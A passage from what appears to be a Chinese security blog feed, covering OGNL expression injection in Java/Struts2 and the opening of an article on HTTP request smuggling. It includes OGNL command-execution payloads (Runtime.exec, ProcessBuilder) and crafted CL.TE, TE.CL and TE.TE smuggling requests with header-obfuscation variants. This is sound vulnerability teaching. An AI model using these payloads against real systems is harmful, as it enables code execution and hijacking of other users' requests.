class="headerlink" title="# 和 . 和 @ 的区别"></a># 和 . 和 @ 的区别</h3><ul><li>获取静态函数和变量的时候用@</li><li>获取非静态函数用.号获取</li><li>获取非静态变量用#获取</li></ul><h3 id="基本用法Demo"><a href="#基本用法Demo" class="headerlink" title="基本用法Demo"></a>基本用法Demo</h3><p>依赖的jar包：ognl-2.6.11.jar</p><p>示例代码1，基本的调用执行OGNL表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String str = <span class="string">"1+2"</span>;</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可输出<code>result:3</code>。</p><p>示例代码2，使用#符号从上下文获取变量值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        context.put(<span class="string">"user"</span>,user);</span><br><span class="line">        String str = <span class="string">"#user.name"</span>;</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出<code>result:mi1k7ea</code>。</p><h3 id="OGNL与EL的区别"><a href="#OGNL与EL的区别" class="headerlink" title="OGNL与EL的区别"></a>OGNL与EL的区别</h3><p>因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。</p><p>Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。</p><p>页面取值区别如下表：</p><table><thead><tr><th>名称</th><th>servlet</th><th>OGNL</th><th>EL</th></tr></thead><tbody><tr><td>parameters</td><td>request.getParameter(“username”)</td><td>#username</td><td>${username}</td></tr><tr><td>request</td><td>request.getAttribute(“userName”)</td><td>#request.userName</td><td>${requestScope.username}</td></tr><tr><td>session</td><td>session.getAttribute(“userName”)</td><td>#session.userName</td><td>${sessionScope.username}</td></tr><tr><td>application</td><td>application.getAttribute(“userName”)</td><td>#application.userName</td><td>${applicationScope.username}</td></tr><tr><td>attr</td><td>用于按request &gt; session &gt; application顺序访问其属性（attribute）</td><td>#attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止</td></tr></tbody></table><h2 id="0x02-能解析OGNL的API"><a href="#0x02-能解析OGNL的API" class="headerlink" title="0x02 能解析OGNL的API"></a>0x02 能解析OGNL的API</h2><p>能解析OGNL的API如下表：</p><table><thead><tr><th style="text-align:left">类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParseUtil</td><td style="text-align:left">translateVariables,translateVariablesCollection</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.OgnlTextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlUtil</td><td style="text-align:left">setProperties,setProperty,setValue,getValue,callMethod,compile</td></tr><tr><td style="text-align:left">org.apache.struts2.util.VelocityStrutsUtil</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">org.apache.struts2.util.StrutsUtil</td><td style="text-align:left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td></tr><tr><td style="text-align:left">org.apache.struts2.views.jsp.ui.OgnlTool</td><td style="text-align:left">findValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.ValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter,trySetValue</td></tr><tr><td style="text-align:left">ognl.Ognl</td><td style="text-align:left">parseExpression,getValue,setValue</td></tr></tbody></table><p>以下是调用过程中可能会涉及到的一些类：</p><table><thead><tr><th style="text-align:left">涉及类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr></tbody></table><h2 id="0x03-OGNL表达式注入漏洞"><a href="#0x03-OGNL表达式注入漏洞" class="headerlink" title="0x03 OGNL表达式注入漏洞"></a>0x03 OGNL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。</p><p>最简单的弹计算器的Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue()触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('calc')"</span>, context, context.getRoot());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// setValue()触发</span></span><br><span class="line"><span class="comment">//        Ognl.setValue(Runtime.getRuntime().exec("calc"), context, context.getRoot());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/3.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。</p><p>在前面的<code>Ognl.getValue</code>代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/5.png" alt=""></p><p>往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/6.png" alt=""></p><p>由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/7.png" alt=""></p><p>evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/8.png" alt=""></p><p>跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即<a href="mailto:`@java.lang.Runtime" target="_blank" rel="noopener">`@java.lang.Runtime</a>@getRuntime()`这个OGNL表达式：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/9.png" alt=""></p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/10.png" alt=""></p><p>跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/11.png" alt=""></p><p>跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/12.png" alt=""></p><p>往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/13.png" alt=""></p><p>跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/14.png" alt=""></p><p>跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/15.png" alt=""></p><p>当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。</p><p>接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为<code>exec(&quot;calc&quot;)</code>：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/16.png" alt=""></p><p>后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/17.png" alt=""></p><p>往下，解析得到具体的类方法exec()：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/18.png" alt=""></p><p>往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/19.png" alt=""></p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">invokeMethod:518, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:812, OgnlRuntime (ognl)</span><br><span class="line">callMethod:61, ObjectMethodAccessor (ognl)</span><br><span class="line">callMethod:846, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:73, ASTMethod (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValueBody:109, ASTChain (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:378, Ognl (ognl)</span><br><span class="line">getValue:357, Ognl (ognl)</span><br><span class="line">main:11, Test</span><br></pre></td></tr></table></figure><p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p><h3 id="HTTP请求中常见的注入点"><a href="#HTTP请求中常见的注入点" class="headerlink" title="HTTP请求中常见的注入点"></a>HTTP请求中常见的注入点</h3><p>HTTP请求中常见的注入点如下表（来自<a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2著名RCE漏洞引发的十年之思</a>）：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/4.png" alt=""></p><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//获取context里面的变量</span><br><span class="line"> #user</span><br><span class="line"> #user.name</span><br><span class="line"></span><br><span class="line">//使用runtime执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x04-Struts2中OGNL执行过程分析"><a href="#0x04-Struts2中OGNL执行过程分析" class="headerlink" title="0x04 Struts2中OGNL执行过程分析"></a>0x04 Struts2中OGNL执行过程分析</h2><p>有时间再调试分析，可参考：<a href="https://paper.seebug.org/794/#0x02-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x05-OGNL攻防史"><a href="#0x05-OGNL攻防史" class="headerlink" title="0x05 OGNL攻防史"></a>0x05 OGNL攻防史</h2><p>有时间再详细分析，可参考：<a href="https://paper.seebug.org/794/#0x03-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://c.biancheng.net/view/4131.html" target="_blank" rel="noopener">OGNL</a></p><p><a href="http://p0desta.com/2019/04/06/从零开始java代码审计系列(三" target="_blank" rel="noopener">OGNL表达式注入分析</a>/)</p><p><a href="https://paper.seebug.org/794/" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="OGNL注入" scheme="https://www.mi1k7ea.com/tags/OGNL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析HRS漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/11/%E6%B5%85%E6%9E%90HRS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/11/浅析HRS漏洞/</id>
    <published>2020-03-11T15:59:05.000Z</published>
    <updated>2020-03-15T15:41:01.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要参考：<a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p>实验环境：<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p>BurpSuite插件http-request-smuggler：<a href="https://github.com/portswigger/http-request-smuggler" target="_blank" rel="noopener">https://github.com/portswigger/http-request-smuggler</a></p><p>推荐一些深入浅出的好文：</p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p><p>HRS扫描原理及实现：</p><p><a href="https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">流量夹带(HTTP Request Smuggling) 检测方案的实现</a></p><h2 id="0x01-HRS简介"><a href="#0x01-HRS简介" class="headerlink" title="0x01 HRS简介"></a>0x01 HRS简介</h2><p>HRS全称Http Request Smuggling即HTTP请求走私。HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其允许攻击者绕过安全控制，获得对敏感数据的未经授权的访问，并直接危害其他应用程序用户。此外，还可以结合XSS、Web缓存中毒等深入利用。</p><p>HRS最早于2005年就被发现了，但因利用方式和危害影响所限被一直忽视。直至最近几年因为重视敏感信息的窃取以及利用新方法的提出才被重新提及。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>简单地说，<strong>HRS漏洞的根源在于前端服务器和后端服务器对HTTP请求解析存在二义性</strong>。</p><h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><blockquote><p>当今的Web应用程序经常在用户和最终应用程序逻辑之间使用HTTP服务器链，即用户将请求发送到前端服务器（有时称为负载均衡器或反向代理），此服务器将请求转发给一个或多个后端服务器。</p><p>当前端服务器将HTTP请求转发到后端服务器时，通常会通过相同的后端网络连接发送多个请求，因为这样做的效率和性能要高得多。协议非常简单：一个接一个地发送HTTP请求，接收服务器解析HTTP请求头，以确定一个请求的结束位置和下一个请求开始的位置：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/1.png" alt=""></p><blockquote><p>在这种情况下，前端和后端服务器必须就请求之间的边界达成一致。否则，攻击者可能会发送由前端服务器和后端服务器不同解释的模糊请求：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/2.png" alt=""></p><blockquote><p>在这里，攻击者将其前端请求的一部分由后端服务器解释为下一个请求的开始。它有效地优先于下一个请求，因此可能会干扰应用程序处理该请求的方式。这是一次请求走私攻击，可能会造成毁灭性的后果。</p></blockquote><h3 id="两个HTTP头字段"><a href="#两个HTTP头字段" class="headerlink" title="两个HTTP头字段"></a>两个HTTP头字段</h3><p>大多数HRS漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：</p><ul><li>Content-Length（后面简称CL）</li><li>Transfer-Encoding（后面简称TE）</li></ul><p>CL头很常见，它指定消息体的长度（以字节为单位），比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure><p>TE头即传输编码标头，用于指定消息主体使用分组编码。这意味着消息体包含一个或多个数据块。每个块包含以字节为单位的块大小（以十六进制表示），后面是换行符，后面是块内容。消息以0大小的块结束。</p><p>chunk传输数据格式如下，其中size的值由16进制表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意：许多安全测试人员不知道可以在HTTP请求中使用TE的原因有二：</p><ul><li>BurpSuite自动解压分组编码，使消息更易于查看和编辑；</li><li>浏览器通常不会在请求中使用TE，而且通常只在服务器响应中看到；</li></ul><h3 id="二义性造就HRS"><a href="#二义性造就HRS" class="headerlink" title="二义性造就HRS"></a>二义性造就HRS</h3><p>如果一个HTTP请求包含了两个标注请求结束位置不一致的头字段会怎么样呢？</p><p>假设前端优先考虑第一个CL，后端优先考虑第二个CL。从后端角度看，TCP的流程可能是以下这样的：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>在这个例子中，注入的“G”将攻击绿色用户的请求，他们可能会得到类似于“Unknown method GPOST”的响应。这就是因为前后端服务器对于HTTP请求的结束位置头字段解析的二义性导致的HRS问题。</p><p>而在现实中，双CL很少被使用，因为许多系统会明确地拒绝具有多个CL的请求。相反，我们将使用TE攻击系统，不过前提是使用RFC 2616规范。TE是HTTP1.1协议中定义的Web用户向服务器提交数据的一种方法，当服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。</p><p>如果接收到的消息同时具有TE头字段和CL头字段，则必须忽略CL头字段。由于RFC 2616规范默许可以使用<code>Transfer-Encoding: chunked</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。</p><p>比如前端服务器支持CL，后端服务器支持TE，发送如下请求：</p><p><img src="/2020/03/11/浅析HRS漏洞/4.png" alt=""></p><p>由于前端服务器不支持TE而后端服务器支持，从而导致”G”注入到了绿色用户的请求，使得HRS攻击成功。</p><p>同理，前端服务器支持TE，后端服务器支持CL的例子如下，只需将两个头结束位置的设置颠倒一下即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/5.png" alt=""></p><h2 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h2><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>CL.TE即前端服务器使用Content-Length头，后端服务器是使用Transfer-Encoding头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>前端服务器处理CL头并确定请求正文长度为13字节，直到“SMUGGLED”结束，并将此请求转发到后端服务器。但后端服务器处理TE头，因此将消息体视为使用分块编码。它按序处理数据块，但第一个块就为<code>0\r\n\r\n</code>数据块，因此处理终止，后续消息体“SMUGGLED”将不会被执行处理，后端服务器将这些字节视为序列中下一个请求的开始。此时，如果前端服务器继续向后端服务器转发请求，那么后端服务器下一个接收到的请求就会是：SMUGGLED+POST=SMUGGLEDPOST的请求方法，这样，后端服务器会返回响应：Unknown method SMUGGLEDPOST。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>TE.CL即前端服务器使用Transfer-Encoding头，后端服务器是使用Content-Length头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这种情况下，前端服务器支持TE，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器之后，由于后端服务器采用CL，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，侯丹服务器会将余下内容视为请求序列中下一个请求的起始。</p><p>注意：要使用BurpSuite的Repeater发送此请求，首先需要转到Reperter菜单中确保未选中“UpdateContent-Length”选项。此外，还需要包含尾随序列0后面的\r\n\r\n。</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE即前端和后端服务器都支持采用Transfer-Encoding头，但其中一台服务器可以通过某种方式混淆报头，从而避免对其进行处理。从某种意义上还是CL.TE或TE.CL。</p><p>这里主要用到混淆TE头的技巧，包括但不限于如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h3><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>就这种情况而言，一般都是无法利用了。但是总有服务器不会严格的实现该规范，假设前端服务器和后端服务器在收到类似的请求时，都不会返回400错误，但是前端服务器按照第一个CL的值对请求进行处理，而后端服务器按照第二个CL的值进行处理，这样同样存在HRS漏洞，如前面漏洞原理中讲到的例子：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>但是这种情况极其少见。</p><h2 